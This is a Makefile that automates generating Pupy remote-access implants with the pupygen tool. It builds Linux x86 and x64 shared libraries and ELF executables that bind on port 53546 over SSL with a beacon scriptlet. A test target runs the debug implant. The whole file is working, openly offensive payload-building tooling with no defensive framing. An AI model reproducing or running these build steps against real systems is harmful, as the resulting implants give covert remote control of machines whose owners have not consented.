# PATH=/usr/local/$(PREFIX)
OS=linux
PROJECT=$(HOME)/pupy
WORKSPACE=pupyw
WORKSPACEPATH=$(PROJECT)/$(WORKSPACE)
BINDPORT=53546
TRANSPORT=ssl
SCRIPTLET=-s beacon_keen 
PAYLOADTYPE=client
GENARGS=-f $(PAYLOADTYPE) -E 
#-D$(OUTDIR) 

all: $(PAYLOADTYPE)_$(OS)_bind-$(BINDPORT)-$(TRANSPORT)_x64.so $(PAYLOADTYPE)_$(OS)_bind-$(BINDPORT)-$(TRANSPORT)_x86.so $(PAYLOADTYPE)_$(OS)_bind-$(BINDPORT)-$(TRANSPORT)_x86.elf  $(PAYLOADTYPE)_$(OS)_bind-$(BINDPORT)-$(TRANSPORT)_x64.elf 

rebuild: clean-all create-workspace all

create-workspace: pupyw

pupyw:
	@test -d build || mkdir build
	./create-workspace.py -DG pupyw
	test -f $(PROJECT)/.pupy_history && cp $(PROJECT)/.pupy_history $(WORKSPACEPATH)/.pupy_history
	
test: debug-$(PAYLOADTYPE)_$(OS)_bind-$(BINDPORT)-$(TRANSPORT)_x64
# 	BIN=
	@chmod +x ./build/$< 
	./build/$< 
	#&& ./build/$<
	

debug-$(PAYLOADTYPE)_$(OS)_bind-$(BINDPORT)-$(TRANSPORT)_x64:
	pupygen -A x64 -O linux --debug $(GENARGS) $(SCRIPTLET) -o $@ bind -t $(TRANSPORT) --port $(BINDPORT) >/dev/null #| grep "OUTPUT_PATH"
	@test -f "$(PROJECT)/$(WORKSPACE)/$@" && mv "$(PROJECT)/$(WORKSPACE)/$@" ./build/
	ln -sf ./build/$@ ./$@
	
	
$(PAYLOADTYPE)_$(OS)_bind-$(BINDPORT)-$(TRANSPORT)_x64.so:
	pupygen -A x64 -O linux -S $(GENARGS) $(SCRIPTLET) -o $@ bind -t $(TRANSPORT) --port $(BINDPORT) >/dev/null #| grep "OUTPUT_PATH"
	@test -f "$(PROJECT)/$(WORKSPACE)/$@" && mv "$(PROJECT)/$(WORKSPACE)/$@" ./build/
	ln -sf ./build/$@ ./$@


$(PAYLOADTYPE)_$(OS)_bind-$(BINDPORT)-$(TRANSPORT)_x86.so:
	pupygen -A x86 -O linux -S $(GENARGS) $(SCRIPTLET) -o $@ bind -t $(TRANSPORT) --port $(BINDPORT) >/dev/null #| grep "OUTPUT_PATH"
	@test -f "$(PROJECT)/$(WORKSPACE)/$@" && mv "$(PROJECT)/$(WORKSPACE)/$@" ./build/
	ln -sf ./build/$@ ./$@


$(PAYLOADTYPE)_$(OS)_bind-$(BINDPORT)-$(TRANSPORT)_x86.elf:
	pupygen -A x86 -O linux $(GENARGS) $(SCRIPTLET) -o $@ bind -t $(TRANSPORT) --port $(BINDPORT) >/dev/null#| grep "OUTPUT_PATH"
	@test -f "$(PROJECT)/$(WORKSPACE)/$@" && mv "$(PROJECT)/$(WORKSPACE)/$@" ./build/
	ln -sf ./build/$@ ./$@


$(PAYLOADTYPE)_$(OS)_bind-$(BINDPORT)-$(TRANSPORT)_x64.elf: 
	pupygen -A x64 -O linux $(GENARGS) $(SCRIPTLET) -o $@ bind -t $(TRANSPORT) --port $(BINDPORT) >/dev/null#| grep "OUTPUT_PATH"
	@test -f "$(PROJECT)/$(WORKSPACE)/$@" && mv "$(PROJECT)/$(WORKSPACE)/$@" ./build/
	ln -sf ./build/$@ ./$@
	
clean:
	rm -fR build/* ./*.so ./*.elf 2>/dev/null
	
clean-all:
	test -f $(WORKSPACEPATH)/.pupy_history && cp $(WORKSPACEPATH)/.pupy_history $(PROJECT)/.pupy_history 
	rm -fR pupyw 




